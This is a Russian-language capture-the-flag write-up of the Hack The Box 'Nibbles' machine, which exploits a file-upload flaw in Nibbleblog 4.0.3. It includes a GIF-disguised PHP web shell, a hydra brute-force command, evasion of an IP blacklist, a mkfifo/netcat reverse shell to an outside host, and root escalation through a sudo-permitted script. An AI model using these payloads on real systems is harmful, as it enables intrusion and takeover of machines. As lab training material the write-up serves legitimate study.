# Nibbles (HTB)

> Платформа: Hack The Box  
> ОС: Linux  
> Сложность: Easy  
> Результат: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -sC -sV -A → 22 (OpenSSH 7.2p2), 80 (Apache 2.4.18 Ubuntu 16.04)
└── Burp → HTML-комментарий: <!-- /nibbleblog/ directory. Nothing interesting here! -->

Foothold
├── /nibbleblog/ → "Powered by Nibbleblog"
├── /nibbleblog/admin/boot/rules/98-constants.bit → NIBBLEBLOG_VERSION = 4.0.3 "Coffee"
├── searchsploit nibbleblog → php/remote/38489.rb (Arbitrary File Upload)
├── /nibbleblog/update.php → ./content/private/
├── /nibbleblog/content/private/users.xml → username: admin
├── hydra → IP попал в blacklist
├── новый VPN IP → admin:nibbles
└── /nibbleblog/admin.php?controller=plugins&action=list → My Image plugin

Exploitation (File Upload)
├── cmd.php: GIF8; <?php echo system($_REQUEST['ipp']); ?>
├── Upload через My Image → /nibbleblog/content/private/plugins/my_image/image.php
├── ?ipp=whoami → RCE (nibbler)
└── Reverse shell через POST → nc -lvnp 9001

Lateral Movement / User Flag
├── /home/nibbler/user.txt
└── Stabilize: python3 -c 'import pty;pty.spawn("/bin/bash")'

Privilege Escalation
├── sudo -l → (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
├── mkdir -p personal/stuff
├── echo '/bin/bash -ip' > monitor.sh && chmod +x monitor.sh
├── sudo ./monitor.sh → root
└── cat /root/root.txt
```

---

## Machine Briefing

Ubuntu 16.04 с Apache 2.4.18. На веб-сервере — Nibbleblog 4.0.3 "Coffee". Плагин My Image позволяет загружать файлы без проверки расширения.

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sC -sV -A -T5 -Pn 10.129.96.84
```

| Порт | Сервис | Версия                          |
|------|--------|---------------------------------|
| 22   | SSH    | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 |
| 80   | HTTP   | Apache httpd 2.4.18 (Ubuntu)    |

Порт 5904 отфильтрован.

### Определение стека

Через Burp в ответе найден HTML-комментарий:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

---

## Foothold

### Определение версии Nibbleblog

```bash
curl http://10.129.96.84/nibbleblog/admin/boot/rules/98-constants.bit
```

```php
define('NIBBLEBLOG_VERSION', '4.0.3');
define('NIBBLEBLOG_NAME',    'Coffee');
```

### Поиск публичных эксплойтов

```bash
searchsploit nibbleblog
```

| Exploit Title                                         | Path                  |
|-------------------------------------------------------|-----------------------|
| Nibbleblog 3 - Multiple SQL Injections                | php/webapps/35865.txt |
| Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb   |

Копируем для анализа:

```bash
searchsploit -m php/remote/38489.rb
```

### Ключевые поля эксплойта

```ruby
'uri' => normalize_uri(target_uri.path, 'admin.php'),
'vars_get' => {
  'controller' => 'plugins',
  'action'     => 'config',
  'plugin'     => 'my_image'
}
```

Уязвимость: при загрузке через плагин My Image сохраняется оригинальное расширение файла, тип не проверяется — можно загрузить PHP.

### Получение учётных данных

```bash
curl http://10.129.96.84/nibbleblog/update.php
# DB updated: ./content/private/config.xml
# DB updated: ./content/private/comments.xml

curl http://10.129.96.84/nibbleblog/content/private/users.xml
```

Видим пользователя `admin`. Первая попытка брутфорса через hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou-50.txt 10.129.96.84 \
  http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password" -t 64
```

После 5 неудачных попыток IP попал в blacklist (см. `users.xml`). Решение — сменить VPN-профиль, получить новый IP и подобрать вручную:

```
admin:nibbles
```

### Upload вебшелла

Создаём файл `cmd.php` с GIF8-заголовком:

```
GIF8;
<?php echo system($_REQUEST['ipp']); ?>
```

Проверка:

```bash
file cmd.php
# cmd.php: GIF image data 16188 x 26736
```

�-агрузка через `/nibbleblog/admin.php?controller=plugins&action=list` → My Image.

После загрузки:

```
http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?ipp=whoami
# GIF8; nibbler nibbler
```

### Reverse shell

```
ipp=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 9001 >/tmp/f
```

В Burp Repeater — метод POST, URL-encode через Ctrl+U.

```bash
nc -lvnp 9001
```

### Stabilize shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### User flag

```bash
cat /home/nibbler/user.txt
```

---

## Privilege Escalation

### Enumeration sudo

```bash
sudo -l
```

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Файл отсутствует — создаём сами:

```bash
mkdir -p personal/stuff
echo '/bin/bash -ip' > personal/stuff/monitor.sh
chmod +x personal/stuff/monitor.sh
sudo ./personal/stuff/monitor.sh
```

Получаем root shell. Читаем флаг:

```bash
cat /root/root.txt
```

---

## Flags

| Флаг | �-начение                       |
|------|--------------------------------|
| User | (см. `/home/nibbler/user.txt`) |
| Root | (см. `/root/root.txt`)         |

---

## Key Takeaways

- **Nibbleblog 4.0.3 My Image plugin** — загрузка файлов без проверки расширения и MIME, классический путь к RCE.
- **GIF8-обёртка** — обход проверки на "изображение" без необходимости реально пересобирать файл.
- **IP-блэклист в Nibbleblog** — 5 неудачных логинов блокируют IP; решается сменой VPN-профиля.
- **`sudo -l` на несуществующий скрипт** — если root разрешает запуск файла от root без пароля, а файла нет, его можно создать самостоятельно.